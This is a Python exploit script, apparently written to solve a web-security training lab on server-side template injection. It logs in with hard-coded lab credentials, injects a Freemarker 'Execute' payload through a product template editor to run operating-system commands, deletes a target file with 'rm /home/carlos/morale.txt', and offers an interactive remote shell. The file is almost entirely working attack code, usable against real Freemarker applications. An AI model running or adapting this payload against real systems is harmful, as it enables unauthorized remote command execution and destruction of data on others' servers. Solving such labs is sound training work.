from base_scenario import BaseLabScenario
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import re

# ANSI Color Codes
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_WHITE = "\033[97m"
COLOR_RESET = "\033[0m"

class Lab3Scenario(BaseLabScenario):
    """Exploit for 'Server-side template injection using documentation' lab"""
    
    def __init__(self, target_url, session):  # Match parent class signature
        super().__init__(target_url, session)
        self.product_id = "1"  # Default product ID, might need adjustment

    @classmethod
    def detect(cls, response_text):
        """Check if this is Lab 3 by looking for identifying text"""
        return "Server-side template injection using documentation" in response_text
    
    def lab_name(self):
        return "Server-side template injection using documentation (Lab 3)"

    def get_template_csrf(self):
        """Get CSRF token from template editing page"""
        try:
            template_page = self.session.get(
                urljoin(self.target_url, f"/product/template?productId={self.product_id}")
            )
            return self.get_csrf_token(template_page.text)
        except Exception as e:
            print(f"[-] Error getting template CSRF: {str(e)}")
            return None

    def execute_command(self, command):
        """Execute command using Freemarker SSTI vulnerability"""
        try:
            # Get CSRF token
            csrf_token = self.get_template_csrf()
            if not csrf_token:
                return None
            
            # Prepare Freemarker payload
            payload = (
                f'<#assign ex="freemarker.template.utility.Execute"?new()>'
                f'${{ ex("{command}") }}'
            )
            
            # Send exploit payload
            response = self.session.post(
                urljoin(self.target_url, f"/product/template?productId={self.product_id}"),
                data={
                    "csrf": csrf_token,
                    "template": payload,
                    "template-action": "preview"
                }
            )
            
            # Extract command output
            return self._extract_output(response.text)
            
        except Exception as e:
            print(f"[-] Command execution error: {str(e)}")
            return None

    def _extract_output(self, response_text):
        """Extract command output from preview result"""
        soup = BeautifulSoup(response_text, 'html.parser')
        preview_div = soup.find('div', {'id': 'preview-result'})
        if preview_div:
            output = '\n'.join(
                [line.strip() for line in preview_div.text.split('\n') if line.strip()]
            )
            return output
        return None

    def exploit(self):
        """Execute full lab exploitation workflow"""
        try:
            # Login with content manager credentials
            if not self.login("content-manager", "C0nt3ntM4n4g3r"):
                return False
            
            # Test command execution
            test_cmd = "whoami"
            result = self.execute_command(test_cmd)
            
            if result and "carlos" in result:
                print(f"{COLOR_GREEN}[+] Command execution verified!{COLOR_RESET}")
                print(f"{COLOR_CYAN}[*] Deleting morale.txt...{COLOR_RESET}")
                
                # Delete target file
                self.execute_command("rm /home/carlos/morale.txt")
                
                return True
            
            print(f"{COLOR_RED}[-] Initial command execution failed{COLOR_RESET}")
            return False
            
        except Exception as e:
            print(f"{COLOR_RED}[-] Exploit error: {str(e)}{COLOR_RESET}")
            return False

if __name__ == "__main__":
    import argparse
    import requests
    
    parser = argparse.ArgumentParser(description="SSTI Lab 3 Exploiter")
    parser.add_argument("url", help="Target lab URL")
    parser.add_argument("--proxy", help="Proxy server (ip:port)", default=None)
    parser.add_argument("--shell", action="store_true", help="Start interactive shell")
    
    args = parser.parse_args()
    
    # Configure session with proxy
    session = requests.Session()
    session.verify = False
    if args.proxy:
        proxy = args.proxy if args.proxy.startswith(('http://', 'https://')) else f"http://{args.proxy}"
        session.proxies = {'http': proxy, 'https': proxy}
    
    print("\n=== Starting Lab 3 Exploitation ===")
    exploiter = Lab3Scenario(args.url.strip(), session)
    
    if exploiter.exploit() and args.shell:
        exploiter.interactive_shell()
